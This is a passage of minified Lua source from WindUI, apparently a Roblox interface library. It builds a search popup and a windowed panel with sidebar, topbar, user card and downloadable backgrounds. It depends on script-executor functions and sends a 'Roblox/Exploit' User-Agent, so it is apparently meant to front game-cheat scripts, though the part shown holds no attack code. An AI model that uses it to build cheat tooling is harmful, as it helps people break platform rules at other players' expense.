ak("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
},{
ak("ImageLabel",{
Image=ai.Icon"search"[1],
ImageRectSize=ai.Icon"search"[2].ImageRectSize,
ImageRectOffset=ai.Icon"search"[2].ImageRectPosition,
BackgroundTransparency=1,
ThemeTag={
ImageColor3="Icon",
},
ImageTransparency=0.1,
Size=UDim2.new(0,ap.IconSize,0,ap.IconSize),
}),
aq,
ar,
ak("UIListLayout",{
Padding=UDim.new(0,ap.Padding),
FillDirection="Horizontal",
VerticalAlignment="Center",
}),
ak("UIPadding",{
PaddingLeft=UDim.new(0,ap.Padding),
PaddingRight=UDim.new(0,ap.Padding),
}),
}),
}),
ak("Frame",{
BackgroundTransparency=1,
AutomaticSize="Y",
Size=UDim2.new(1,0,0,0),
Name="Results",
},{
ak("Frame",{
Size=UDim2.new(1,0,0,1),
ThemeTag={
BackgroundColor3="Outline",
},
BackgroundTransparency=0.9,
Visible=false,
}),
as,
ak("UISizeConstraint",{
MaxSize=Vector2.new(ap.Width,ap.MaxHeight),
}),
}),
ak("UIListLayout",{
Padding=UDim.new(0,0),
FillDirection="Vertical",
}),
}),
})

local au=ak("Frame",{
Size=UDim2.new(0,ap.Width,0,0),
AutomaticSize="Y",
Parent=an,
BackgroundTransparency=1,
Position=UDim2.new(0.5,0,0.5,0),
AnchorPoint=Vector2.new(0.5,0.5),
Visible=false,

ZIndex=99999999,
},{
ak("UIScale",{
Scale=0.9,
}),
at,















})

local function CreateSearchTab(av,aw,ax,ay,az,aA)
local aB=ak("TextButton",{
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
BackgroundTransparency=1,
Parent=ay or nil,
},{
ai.NewRoundFrame(ap.Radius-11,"Squircle",{
Size=UDim2.new(1,0,0,0),
Position=UDim2.new(0.5,0,0.5,0),
AnchorPoint=Vector2.new(0.5,0.5),

ThemeTag={
ImageColor3="Text",
},
ImageTransparency=1,
Name="Main",
},{
ai.NewRoundFrame(ap.Radius-11,"Glass-1",{
Size=UDim2.new(1,0,1,0),
Position=UDim2.new(0.5,0,0.5,0),
AnchorPoint=Vector2.new(0.5,0.5),
ThemeTag={
ImageColor3="White",
},
ImageTransparency=1,
Name="Outline",
},{








ak("UIPadding",{
PaddingTop=UDim.new(0,ap.Padding-2),
PaddingLeft=UDim.new(0,ap.Padding),
PaddingRight=UDim.new(0,ap.Padding),
PaddingBottom=UDim.new(0,ap.Padding-2),
}),
ak("ImageLabel",{
Image=ai.Icon(ax)[1],
ImageRectSize=ai.Icon(ax)[2].ImageRectSize,
ImageRectOffset=ai.Icon(ax)[2].ImageRectPosition,
BackgroundTransparency=1,
ThemeTag={
ImageColor3="Icon",
},
ImageTransparency=0.1,
Size=UDim2.new(0,ap.IconSize,0,ap.IconSize),
}),
ak("Frame",{
Size=UDim2.new(1,-ap.IconSize-ap.Padding,0,0),
BackgroundTransparency=1,
},{
ak("TextLabel",{
Text=av,
ThemeTag={
TextColor3="Text",
},
TextSize=17,
BackgroundTransparency=1,
TextXAlignment="Left",
FontFace=Font.new(ai.Font,Enum.FontWeight.Medium),
Size=UDim2.new(1,0,0,0),
TextTruncate="AtEnd",
AutomaticSize="Y",
Name="Title",
}),
ak("TextLabel",{
Text=aw or"",
Visible=aw and true or false,
ThemeTag={
TextColor3="Text",
},
TextSize=15,
TextTransparency=0.3,
BackgroundTransparency=1,
TextXAlignment="Left",
FontFace=Font.new(ai.Font,Enum.FontWeight.Medium),
Size=UDim2.new(1,0,0,0),
TextTruncate="AtEnd",
AutomaticSize="Y",
Name="Desc",
})or nil,
ak("UIListLayout",{
Padding=UDim.new(0,6),
FillDirection="Vertical",
}),
}),
ak("UIListLayout",{
Padding=UDim.new(0,ap.Padding),
FillDirection="Horizontal",
}),
}),
},true),
ak("Frame",{
Name="ParentContainer",
Size=UDim2.new(1,-ap.Padding,0,0),
AutomaticSize="Y",
BackgroundTransparency=1,
Visible=az,

},{
ai.NewRoundFrame(99,"Squircle",{
Size=UDim2.new(0,2,1,0),
BackgroundTransparency=1,
ThemeTag={
ImageColor3="Text",
},
ImageTransparency=0.9,
}),
ak("Frame",{
Size=UDim2.new(1,-ap.Padding-2,0,0),
Position=UDim2.new(0,ap.Padding+2,0,0),
BackgroundTransparency=1,
},{
ak("UIListLayout",{
Padding=UDim.new(0,0),
FillDirection="Vertical",
}),
}),
}),
ak("UIListLayout",{
Padding=UDim.new(0,0),
FillDirection="Vertical",
HorizontalAlignment="Right",
}),
})



aB.Main.Size=UDim2.new(
1,
0,
0,
aB.Main.Outline.Frame.Desc.Visible
and(((ap.Padding-2)*2)+aB.Main.Outline.Frame.Title.TextBounds.Y+6+aB.Main.Outline.Frame.Desc.TextBounds.Y)
or(((ap.Padding-2)*2)+aB.Main.Outline.Frame.Title.TextBounds.Y)
)

ai.AddSignal(aB.Main.MouseEnter,function()
al(aB.Main,0.04,{ImageTransparency=0.95}):Play()

end)
ai.AddSignal(aB.Main.InputEnded,function()
al(aB.Main,0.08,{ImageTransparency=1}):Play()

end)
ai.AddSignal(aB.Main.MouseButton1Click,function()
if aA then
aA()
end
end)

return aB
end

local function ContainsText(av,aw)
if not aw or aw==""then
return false
end

if not av or av==""then
return false
end

local ax=string.lower(av)
local ay=string.lower(aw)

return string.find(ax,ay,1,true)~=nil
end

local function Search(av)
if not av or av==""then
return{}
end

local aw={}
for ax,ay in next,am.Tabs do
local az=ContainsText(ay.Title or"",av)
local aA={}

for aB,b in next,ay.Elements do
if b.__type~="Section"then
local d=ContainsText(b.Title or"",av)
local f=ContainsText(b.Desc or"",av)

if d or f then
aA[aB]={
Title=b.Title,
Desc=b.Desc,
Original=b,
__type=b.__type,
Index=aB,
}
end
end
end

if az or next(aA)~=nil then
aw[ax]={
Tab=ay,
Title=ay.Title,
Icon=ay.Icon,
Elements=aA,
}
end
end
return aw
end

ai.AddSignal(as.UIListLayout:GetPropertyChangedSignal"AbsoluteContentSize",function()

al(as,0.06,{
Size=UDim2.new(
1,
0,
0,
math.clamp(
as.UIListLayout.AbsoluteContentSize.Y+(ap.Padding*2),
0,
ap.MaxHeight
)
),
},Enum.EasingStyle.Quint,Enum.EasingDirection.InOut):Play()






end)

function ap.Open(av)
task.spawn(function()
at.Frame.Visible=true
au.Visible=true
al(au.UIScale,0.12,{Scale=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end)
end

function ap.Close(av,aw)
task.spawn(function()
ao()
at.Frame.Visible=false
al(au.UIScale,0.12,{Scale=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()

task.wait(0.12)
au.Visible=false
if aw then
au:Destroy()
end
end)
end

ai.AddSignal(ar.TextButton.MouseButton1Click,function()
ap:Close(true)
end)

ap:Open()

function ap.Search(av,aw)
aw=aw or""

local ax=Search(aw)

as.Visible=true
at.Frame.Results.Frame.Visible=true
for ay,az in next,as:GetChildren()do
if az.ClassName~="UIListLayout"and az.ClassName~="UIPadding"then
az:Destroy()
end
end

if ax and next(ax)~=nil then
for ay,az in next,ax do
local aA=ap.Icons.Tab
local aB=CreateSearchTab(az.Title,nil,aA,as,true,function()
ap:Close()
am:SelectTab(ay)
end)
if az.Elements and next(az.Elements)~=nil then
for b,d in next,az.Elements do
local f=ap.Icons[d.__type]
CreateSearchTab(
d.Title,
d.Desc,
f,
aB:FindFirstChild"ParentContainer"and aB.ParentContainer.Frame
or nil,
false,
function()
ap:Close()
am:SelectTab(ay)
if az.Tab.ScrollToTheElement then

az.Tab:ScrollToTheElement(d.Index)
end

end
)

end
end
end
elseif aw~=""then
ak("TextLabel",{
Size=UDim2.new(1,0,0,70),
Text="No results found",
TextSize=16,
ThemeTag={
TextColor3="Text",
},
TextTransparency=0.2,
BackgroundTransparency=1,
FontFace=Font.new(ai.Font,Enum.FontWeight.Medium),
Parent=as,
Name="NotFound",
})
else
as.Visible=false
at.Frame.Results.Frame.Visible=false
end
end

ai.AddSignal(aq:GetPropertyChangedSignal"Text",function()
ap:Search(aq.Text)
end)

return ap
end

return af end function a.ae()



local aa=(cloneref or clonereference or function(aa)
return aa
end)

local af=aa(game:GetService"UserInputService")
local ai=aa(game:GetService"RunService")
local ak=aa(game:GetService"Players")

local al=workspace.CurrentCamera

local am=a.load't'

local an=a.load'd'
local ao=an.New
local ap=an.Tween


local aq=a.load'w'.New
local ar=a.load'm'.New
local as=a.load'x'.New
local at=a.load'y'

local au=a.load'z'



return function(av)
local aw={
Title=av.Title or"UI Library",
Author=av.Author,
Icon=av.Icon,
IconSize=av.IconSize or 22,
IconThemed=av.IconThemed,
IconRadius=av.IconRadius or 0,
Folder=av.Folder,
Resizable=av.Resizable~=false,
Background=av.Background,
BackgroundImageTransparency=av.BackgroundImageTransparency or 0,
ShadowTransparency=av.ShadowTransparency or 0.6,
User=av.User or{},
Footer=av.Footer or{},
Topbar=av.Topbar or{Height=52,ButtonsType="Default"},

Size=av.Size,

MinSize=av.MinSize or Vector2.new(560,350),
MaxSize=av.MaxSize or Vector2.new(850,560),

TopBarButtonIconSize=av.TopBarButtonIconSize,

ToggleKey=av.ToggleKey,
ElementsRadius=av.ElementsRadius,
Radius=av.Radius or 16,
Transparent=av.Transparent or false,
HideSearchBar=av.HideSearchBar~=false,
ScrollBarEnabled=av.ScrollBarEnabled or false,
SideBarWidth=av.SideBarWidth or 200,
Acrylic=av.Acrylic or false,
NewElements=av.NewElements or false,
IgnoreAlerts=av.IgnoreAlerts or false,
HidePanelBackground=av.HidePanelBackground or false,
AutoScale=av.AutoScale~=false,
OpenButton=av.OpenButton,
DragFrameSize=160,

Position=UDim2.new(0.5,0,0.5,0),
UICorner=16,
UIPadding=14,
UIElements={},
CanDropdown=true,
Closed=false,
Parent=av.Parent,
Destroyed=false,
IsFullscreen=false,
CanResize=av.Resizable~=false,
IsOpenButtonEnabled=true,

CurrentConfig=nil,
ConfigManager=nil,
AcrylicPaint=nil,
CurrentTab=nil,
TabModule=nil,

OnOpenCallback=nil,
OnCloseCallback=nil,
OnDestroyCallback=nil,

IsPC=false,

Gap=5,

TopBarButtons={},
AllElements={},

ElementConfig={},

PendingFlags={},

IsToggleDragging=false,
}

aw.UICorner=aw.Radius

aw.TopBarButtonIconSize=aw.TopBarButtonIconSize or(aw.Topbar.ButtonsType=="Mac"and 11 or 16)

aw.ElementConfig={
UIPadding=(aw.NewElements and 10 or 13),
UICorner=aw.ElementsRadius or(aw.NewElements and 23 or 16),
}

local ax=aw.Size or UDim2.new(0,580,0,460)
aw.Size=UDim2.new(
ax.X.Scale,
math.clamp(ax.X.Offset,aw.MinSize.X,aw.MaxSize.X),
ax.Y.Scale,
math.clamp(ax.Y.Offset,aw.MinSize.Y,aw.MaxSize.Y)
)

if aw.Topbar=={}then
aw.Topbar={Height=52,ButtonsType="Default"}
end

if not ai:IsStudio()and aw.Folder and writefile then
if not isfolder("WindUI/"..aw.Folder)then
makefolder("WindUI/"..aw.Folder)
end
if not isfolder("WindUI/"..aw.Folder.."/assets")then
makefolder("WindUI/"..aw.Folder.."/assets")
end
if not isfolder(aw.Folder)then
makefolder(aw.Folder)
end
if not isfolder(aw.Folder.."/assets")then
makefolder(aw.Folder.."/assets")
end
end

local ay=ao("UICorner",{
CornerRadius=UDim.new(0,aw.UICorner),
})

if aw.Folder then
aw.ConfigManager=au:Init(aw)
end

if aw.Acrylic then local
az=am.AcrylicPaint{UseAcrylic=aw.Acrylic}

aw.AcrylicPaint=az
end

local az=ao("Frame",{
Size=UDim2.new(0,32,0,32),
Position=UDim2.new(1,0,1,0),
AnchorPoint=Vector2.new(0.5,0.5),
BackgroundTransparency=1,
ZIndex=99,
Active=true,
},{
ao("ImageLabel",{
Size=UDim2.new(0,96,0,96),
BackgroundTransparency=1,
Image="rbxassetid://120997033468887",
Position=UDim2.new(0.5,-16,0.5,-16),
AnchorPoint=Vector2.new(0.5,0.5),
ImageTransparency=1,
}),
})
local aA=an.NewRoundFrame(aw.UICorner,"Squircle",{
Size=UDim2.new(1,0,1,0),
ImageTransparency=1,
ImageColor3=Color3.new(0,0,0),
ZIndex=98,
Active=false,
},{
ao("ImageLabel",{
Size=UDim2.new(0,70,0,70),
Image=an.Icon"expand"[1],
ImageRectOffset=an.Icon"expand"[2].ImageRectPosition,
ImageRectSize=an.Icon"expand"[2].ImageRectSize,
BackgroundTransparency=1,
Position=UDim2.new(0.5,0,0.5,0),
AnchorPoint=Vector2.new(0.5,0.5),
ImageTransparency=1,
}),
})

local aB=an.NewRoundFrame(aw.UICorner,"Squircle",{
Size=UDim2.new(1,0,1,0),
ImageTransparency=1,
ImageColor3=Color3.new(0,0,0),
ZIndex=999,
Active=false,
})









aw.UIElements.SideBar=ao("ScrollingFrame",{
Size=UDim2.new(
1,
aw.ScrollBarEnabled and-3-(aw.UIPadding/2)or 0,
1,
not aw.HideSearchBar and-45 or 0
),
Position=UDim2.new(0,0,1,0),
AnchorPoint=Vector2.new(0,1),
BackgroundTransparency=1,
ScrollBarThickness=0,
ElasticBehavior="Never",
CanvasSize=UDim2.new(0,0,0,0),
AutomaticCanvasSize="Y",
ScrollingDirection="Y",
ClipsDescendants=true,
VerticalScrollBarPosition="Left",
},{
ao("Frame",{
BackgroundTransparency=1,
AutomaticSize="Y",
Size=UDim2.new(1,0,0,0),
Name="Frame",
},{
ao("UIPadding",{



PaddingBottom=UDim.new(0,aw.UIPadding/2),
}),
ao("UIListLayout",{
SortOrder="LayoutOrder",
Padding=UDim.new(0,aw.Gap),
}),
}),
ao("UIPadding",{

PaddingLeft=UDim.new(0,aw.UIPadding/2),
PaddingRight=UDim.new(0,aw.UIPadding/2),
PaddingBottom=UDim.new(0,aw.UIPadding/2),
}),

})

aw.UIElements.SideBarContainer=ao("Frame",{
Size=UDim2.new(
0,
aw.SideBarWidth,
1,
aw.User.Enabled and-aw.Topbar.Height-42-(aw.UIPadding*2)or-aw.Topbar.Height
),
Position=UDim2.new(0,0,0,aw.Topbar.Height),
BackgroundTransparency=1,
Visible=true,
},{
ao("Frame",{
Name="Content",
BackgroundTransparency=1,
Size=UDim2.new(1,0,1,not aw.HideSearchBar and-45-aw.UIPadding or-aw.UIPadding/2),
Position=UDim2.new(0,0,1,-aw.UIPadding/2),
AnchorPoint=Vector2.new(0,1),
}),
aw.UIElements.SideBar,
})

if aw.ScrollBarEnabled then
as(
aw.UIElements.SideBar,
aw.UIElements.SideBarContainer.Content,
aw,
3,
av.WindUI
)
end

aw.UIElements.MainBar=ao("Frame",{
Size=UDim2.new(1,-aw.UIElements.SideBarContainer.AbsoluteSize.X,1,-aw.Topbar.Height),
Position=UDim2.new(1,0,1,0),
AnchorPoint=Vector2.new(1,1),
BackgroundTransparency=1,
},{
an.NewRoundFrame(aw.UICorner-(aw.UIPadding/2),"Squircle",{
Size=UDim2.new(1,0,1,0),
ThemeTag={
ImageColor3="PanelBackground",
ImageTransparency="PanelBackgroundTransparency",
},


ZIndex=3,
Name="Background",
Visible=not aw.HidePanelBackground,
}),
ao("UIPadding",{

PaddingLeft=UDim.new(0,aw.UIPadding/2),
PaddingRight=UDim.new(0,aw.UIPadding/2),
PaddingBottom=UDim.new(0,aw.UIPadding/2),
}),
})

local b=ao("ImageLabel",{
Image="rbxassetid://8992230677",
ThemeTag={
ImageColor3="WindowShadow",

},
ImageTransparency=1,
Size=UDim2.new(1,100,1,100),
Position=UDim2.new(0,-50,0,-50),
ScaleType="Slice",
SliceCenter=Rect.new(99,99,99,99),
BackgroundTransparency=1,
ZIndex=-999999999999999,
Name="Blur",
})

if af.TouchEnabled and not af.KeyboardEnabled then
aw.IsPC=false
elseif af.KeyboardEnabled then
aw.IsPC=true
else
aw.IsPC=nil
end







local d
if aw.User then
local function GetUserThumb()local
f=ak:GetUserThumbnailAsync(
aw.User.Anonymous and 1 or ak.LocalPlayer.UserId,
Enum.ThumbnailType.HeadShot,
Enum.ThumbnailSize.Size420x420
)
return f
end

d=ao("TextButton",{
Size=UDim2.new(
0,
aw.UIElements.SideBarContainer.AbsoluteSize.X-(aw.UIPadding/2),
0,
42+aw.UIPadding
),
Position=UDim2.new(0,aw.UIPadding/2,1,-(aw.UIPadding/2)),
AnchorPoint=Vector2.new(0,1),
BackgroundTransparency=1,
Visible=aw.User.Enabled or false,
},{
an.NewRoundFrame(aw.UICorner-(aw.UIPadding/2),"SquircleOutline",{
Size=UDim2.new(1,0,1,0),
ThemeTag={
ImageColor3="Text",
},
ImageTransparency=1,
Name="Outline",
},{
ao("UIGradient",{
Rotation=78,
Color=ColorSequence.new{
ColorSequenceKeypoint.new(0.0,Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(0.5,Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(1.0,Color3.fromRGB(255,255,255)),
},
Transparency=NumberSequence.new{
NumberSequenceKeypoint.new(0.0,0.1),
NumberSequenceKeypoint.new(0.5,1),
NumberSequenceKeypoint.new(1.0,0.1),
},
}),
}),
an.NewRoundFrame(aw.UICorner-(aw.UIPadding/2),"Squircle",{
Size=UDim2.new(1,0,1,0),
ThemeTag={
ImageColor3="Text",
},
ImageTransparency=1,
Name="UserIcon",
},{
ao("ImageLabel",{
Image=GetUserThumb(),
BackgroundTransparency=1,
Size=UDim2.new(0,42,0,42),
ThemeTag={
BackgroundColor3="Text",
},
BackgroundTransparency=0.93,
},{
ao("UICorner",{
CornerRadius=UDim.new(1,0),
}),
}),
ao("Frame",{
AutomaticSize="XY",
BackgroundTransparency=1,
},{
ao("TextLabel",{
Text=aw.User.Anonymous and"Anonymous"or ak.LocalPlayer.DisplayName,
TextSize=17,
ThemeTag={
TextColor3="Text",
},
FontFace=Font.new(an.Font,Enum.FontWeight.SemiBold),
AutomaticSize="Y",
BackgroundTransparency=1,
Size=UDim2.new(1,-27,0,0),
TextTruncate="AtEnd",
TextXAlignment="Left",
Name="DisplayName",
}),
ao("TextLabel",{
Text=aw.User.Anonymous and"anonymous"or ak.LocalPlayer.Name,
TextSize=15,
TextTransparency=0.6,
ThemeTag={
TextColor3="Text",
},
FontFace=Font.new(an.Font,Enum.FontWeight.Medium),
AutomaticSize="Y",
BackgroundTransparency=1,
Size=UDim2.new(1,-27,0,0),
TextTruncate="AtEnd",
TextXAlignment="Left",
Name="UserName",
}),
ao("UIListLayout",{
Padding=UDim.new(0,4),
HorizontalAlignment="Left",
}),
}),
ao("UIListLayout",{
Padding=UDim.new(0,aw.UIPadding),
FillDirection="Horizontal",
VerticalAlignment="Center",
}),
ao("UIPadding",{
PaddingLeft=UDim.new(0,aw.UIPadding/2),
PaddingRight=UDim.new(0,aw.UIPadding/2),
}),
}),
})

function aw.User.Enable(f)
aw.User.Enabled=true
ap(
aw.UIElements.SideBarContainer,
0.25,
{Size=UDim2.new(0,aw.SideBarWidth,1,-aw.Topbar.Height-42-(aw.UIPadding*2))},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
d.Visible=true
end
function aw.User.Disable(f)
aw.User.Enabled=false
ap(
aw.UIElements.SideBarContainer,
0.25,
{Size=UDim2.new(0,aw.SideBarWidth,1,-aw.Topbar.Height)},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
d.Visible=false
end
function aw.User.SetAnonymous(f,g)
if g~=false then
g=true
end
aw.User.Anonymous=g
d.UserIcon.ImageLabel.Image=GetUserThumb()
d.UserIcon.Frame.DisplayName.Text=g and"Anonymous"or ak.LocalPlayer.DisplayName
d.UserIcon.Frame.UserName.Text=g and"anonymous"or ak.LocalPlayer.Name
end

if aw.User.Enabled then
aw.User:Enable()
else
aw.User:Disable()
end

if aw.User.Callback then
an.AddSignal(d.MouseButton1Click,function()
aw.User.Callback()
end)
an.AddSignal(d.MouseEnter,function()
ap(d.UserIcon,0.04,{ImageTransparency=0.95}):Play()
ap(d.Outline,0.04,{ImageTransparency=0.85}):Play()
end)
an.AddSignal(d.InputEnded,function()
ap(d.UserIcon,0.04,{ImageTransparency=1}):Play()
ap(d.Outline,0.04,{ImageTransparency=1}):Play()
end)
end
end

local f
local g

local h=false
local i

local l=typeof(aw.Background)=="string"and string.match(aw.Background,"^video:(.+)")or nil

local m=typeof(aw.Background)=="string"
and not l
and string.match(aw.Background,"^https?://.+")
or nil

local p=typeof(aw.Background)=="string"
and not l
and string.match(aw.Background,"^rbxassetid://%d+")
or nil

local function GetImageExtension(r)
if not r or typeof(r)~="string"then
return".png"
end
local u=r:match"^([^?#]+)"or r
local v=u:match"%.(%w+)$"
if v then
v=v:lower()
if v=="jpg"or v=="jpeg"or v=="png"or v=="webp"then
return"."..v
end
end
return".png"
end



if typeof(aw.Background)=="string"and l then
h=true

if string.find(l,"http")then
local r=(aw.Folder or"Temp").."/assets/."..an.SanitizeFilename(l)..".webm"
if not isfile(r)then
local u,v=pcall(function()





local u=game.HttpGet and game:HttpGet(l)
or an.Request{
Url=l,
Method="GET",
Headers={["User-Agent"]="Roblox/Exploit"},
}.Body

writefile(r,u)
end)
if not u then
warn("[ WindUI.Window.Background ] Failed to download video: "..tostring(v))
end
end

local u,v=pcall(function()
return getcustomasset(r)
end)
if not u then
warn("[ WindUI.Window.Background ] Failed to load custom asset: "..tostring(v))
end
warn"[ WindUI.Window.Background ] VideoFrame may not work with custom video"
l=v
end

i=ao("VideoFrame",{
BackgroundTransparency=1,
Size=UDim2.new(1,0,1,0),
Video=l,
Looped=true,
Volume=0,
},{
ao("UICorner",{
CornerRadius=UDim.new(0,aw.UICorner),
}),
})
i:Play()
elseif m then
local r=(aw.Folder or"Temp")
.."/assets/."
..an.SanitizeFilename(m)
..GetImageExtension(m)

if isfile and not isfile(r)then
local u,v=pcall(function()
local u=game.HttpGet and game:HttpGet(m)
or an.Request{
Url=m,
Method="GET",
Headers={["User-Agent"]="Roblox/Exploit"},
}.Body

writefile(r,u)
end)

if not u then
warn("[ Window.Background ] Failed to download image: "..tostring(v))
end
end

local u,v=pcall(function()
return getcustomasset(r)
end)

if not u then
warn("[ Window.Background ] Failed to load custom asset: "..tostring(v))
end

i=ao("ImageLabel",{
BackgroundTransparency=1,
Size=UDim2.new(1,0,1,0),
Image=v,
ImageTransparency=0,
ScaleType="Crop",
},{
ao("UICorner",{
CornerRadius=UDim.new(0,aw.UICorner),
}),
})
elseif p then
i=ao("ImageLabel",{
BackgroundTransparency=1,
Size=UDim2.new(1,0,1,0),
Image=p,
ImageTransparency=0,
ScaleType="Crop",
},{
ao("UICorner",{
CornerRadius=UDim.new(0,aw.UICorner),
}),
})
elseif aw.Background then
i=ao("ImageLabel",{
BackgroundTransparency=1,
Size=UDim2.new(1,0,1,0),
Image=typeof(aw.Background)=="string"and aw.Background or"",
ImageTransparency=1,
ScaleType="Crop",
},{
ao("UICorner",{
CornerRadius=UDim.new(0,aw.UICorner),
}),
})
end

local r=an.NewRoundFrame(99,"Squircle",{
ImageTransparency=0.8,
ImageColor3=Color3.new(1,1,1),
Size=UDim2.new(0,0,0,4),
Position=UDim2.new(0.5,0,1,4),
AnchorPoint=Vector2.new(0.5,0),
},{
ao("TextButton",{
Size=UDim2.new(1,12,1,12),
BackgroundTransparency=1,
Position=UDim2.new(0.5,0,0.5,0),
AnchorPoint=Vector2.new(0.5,0.5),
Active=true,
ZIndex=99,
Name="Frame",
}),
})

function createAuthor(u)
return ao("TextLabel",{
Text=u,
FontFace=Font.new(an.Font,Enum.FontWeight.Medium),
BackgroundTransparency=1,
TextTransparency=0.35,
AutomaticSize="XY",
Parent=aw.UIElements.Main and aw.UIElements.Main.Main.Topbar.Left.Title,
TextXAlignment="Left",
TextSize=13,
LayoutOrder=2,
ThemeTag={
TextColor3="WindowTopbarAuthor",
},
Name="Author",
})
end

local u
local v

if aw.Author then
u=createAuthor(aw.Author)
end

local x=ao("TextLabel",{
Text=aw.Title,
FontFace=Font.new(an.Font,Enum.FontWeight.SemiBold),
BackgroundTransparency=1,
AutomaticSize="XY",
Name="Title",
TextXAlignment="Left",
TextSize=16,
ThemeTag={
TextColor3="WindowTopbarTitle",
},
})

aw.UIElements.Main=ao("Frame",{
Size=UDim2.new(aw.Size.X.Scale,aw.Size.X.Offset,0,0),
Position=aw.Position,
BackgroundTransparency=1,
Parent=av.Parent,
AnchorPoint=Vector2.new(0.5,0.5),
Active=true,

},{
av.WindUI.UIScaleObj,
aw.AcrylicPaint and aw.AcrylicPaint.Frame or nil,
b,
an.NewRoundFrame(aw.UICorner,"Squircle",{
ImageTransparency=1,
Size=UDim2.new(1,0,1,0),
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
Name="Background",
ThemeTag={
ImageColor3="WindowBackground",
},

},{
i,
r,
az,
}),




ay,
aA,
aB,
ao("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
Name="Main",

Visible=false,
ZIndex=97,
},{
ao("UICorner",{
CornerRadius=UDim.new(0,aw.UICorner),
}),
aw.UIElements.SideBarContainer,
aw.UIElements.MainBar,

d,

g,
ao("Frame",{
Size=UDim2.new(1,0,0,aw.Topbar.Height),
BackgroundTransparency=1,
BackgroundColor3=Color3.fromRGB(50,50,50),
Name="Topbar",
},{
f,






ao("Frame",{
AutomaticSize="X",
Size=UDim2.new(0,0,1,0),
BackgroundTransparency=1,
Name="Left",
},{
ao("UIListLayout",{
Padding=UDim.new(0,aw.UIPadding+4),
SortOrder="LayoutOrder",
FillDirection="Horizontal",
VerticalAlignment="Center",
}),
ao("Frame",{
AutomaticSize="XY",
BackgroundTransparency=1,
Name="Title",
Size=UDim2.new(0,0,1,0),
LayoutOrder=2,
},{
ao("UIListLayout",{
Padding=UDim.new(0,0),
SortOrder="LayoutOrder",
FillDirection="Vertical",
VerticalAlignment="Center",
}),
x,
u,
}),
ao("UIPadding",{
PaddingLeft=UDim.new(0,4),
}),
}),
ao("CanvasGroup",{
Size=UDim2.new(0,0,1,0),
BackgroundTransparency=1,
Name="Center",
AnchorPoint=Vector2.new(0,0.5),
Position=UDim2.new(0,0,0.5,0),
AutomaticSize="Y",
Visible=false,
},{



ao("ScrollingFrame",{
Name="Holder",
BackgroundTransparency=1,
AutomaticSize="Y",
ScrollBarThickness=0,
ScrollingDirection="X",
AutomaticCanvasSize="X",
CanvasSize=UDim2.new(0,0,0,0),
Size=UDim2.new(1,0,1,0),


},{

ao("UIListLayout",{
FillDirection="Horizontal",
VerticalAlignment="Center",
HorizontalAlignment="Left",
Padding=UDim.new(0,aw.UIPadding/2),
}),
}),
}),
ao("Frame",{
AutomaticSize="XY",
BackgroundTransparency=1,
Position=UDim2.new(aw.Topbar.ButtonsType=="Default"and 1 or 0,0,0.5,0),
AnchorPoint=Vector2.new(aw.Topbar.ButtonsType=="Default"and 1 or 0,0.5),
Name="Right",
},{
ao("UIListLayout",{
Padding=UDim.new(0,aw.Topbar.ButtonsType=="Default"and 9 or 0),
FillDirection="Horizontal",
SortOrder="LayoutOrder",
}),
}),
ao("UIPadding",{
PaddingTop=UDim.new(0,aw.UIPadding),
PaddingLeft=UDim.new(
0,
aw.Topbar.ButtonsType=="Default"and aw.UIPadding or aw.UIPadding-2
),
PaddingRight=UDim.new(0,8),
PaddingBottom=UDim.new(0,aw.UIPadding),
}),
}),
}),
})

an.AddSignal(aw.UIElements.Main.Main.Topbar.Left:GetPropertyChangedSignal"AbsoluteSize",function()
local z=0
local A=aw.UIElements.Main.Main.Topbar.Right.UIListLayout.AbsoluteContentSize.X
/av.WindUI.UIScale

z=aw.UIElements.Main.Main.Topbar.Left.AbsoluteSize.X/av.WindUI.UIScale
if aw.Topbar.ButtonsType~="Default"then
z=z+A+aw.UIPadding-4
end

aw.UIElements.Main.Main.Topbar.Center.Position=
UDim2.new(0,z+(aw.UIPadding/av.WindUI.UIScale),0.5,0)
aw.UIElements.Main.Main.Topbar.Center.Size=UDim2.new(
1,
-z
-(aw.UIPadding/av.WindUI.UIScale)
-(aw.Topbar.ButtonsType=="Default"and A+aw.UIPadding or 0),
1,
0
)
end)

if aw.Topbar.ButtonsType~="Default"then
an.AddSignal(aw.UIElements.Main.Main.Topbar.Right:GetPropertyChangedSignal"AbsoluteSize",function()
aw.UIElements.Main.Main.Topbar.Left.Position=UDim2.new(
0,
(aw.UIElements.Main.Main.Topbar.Right.AbsoluteSize.X/av.WindUI.UIScale)+aw.UIPadding-4,
0,
0
)
end)
end

function aw.CreateTopbarButton(z,A,B,C,F,G,H,J)
local L=an.Image(
B,
B,
0,
aw.Folder,
"WindowTopbarIcon",
aw.Topbar.ButtonsType=="Default"and true or false,
G,
"WindowTopbarButtonIcon"
)
L.Size=aw.Topbar.ButtonsType=="Default"
and UDim2.new(0,J or aw.TopBarButtonIconSize,0,J or aw.TopBarButtonIconSize)
or UDim2.new(0,0,0,0)
L.AnchorPoint=Vector2.new(0.5,0.5)
L.Position=UDim2.new(0.5,0,0.5,0)
L.ImageLabel.ImageTransparency=aw.Topbar.ButtonsType=="Default"and 0 or 1

if aw.Topbar.ButtonsType~="Default"then
L.ImageLabel.ImageColor3=an.GetTextColorForHSB(H)
end

local M=an.NewRoundFrame(
aw.Topbar.ButtonsType=="Default"and aw.UICorner-(aw.UIPadding/2)or 999,
"Squircle",
{
Size=aw.Topbar.ButtonsType=="Default"
and UDim2.new(0,aw.Topbar.Height-16,0,aw.Topbar.Height-16)
or UDim2.new(0,14,0,14),
LayoutOrder=F or 999,


ZIndex=9999,
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
ImageColor3=aw.Topbar.ButtonsType~="Default"and(H or Color3.fromHex"#ff3030")or nil,
ThemeTag=aw.Topbar.ButtonsType=="Default"and{
ImageColor3="Text",
}or nil,
ImageTransparency=aw.Topbar.ButtonsType=="Default"and 1 or 0,
},
{












L,
ao("UIScale",{
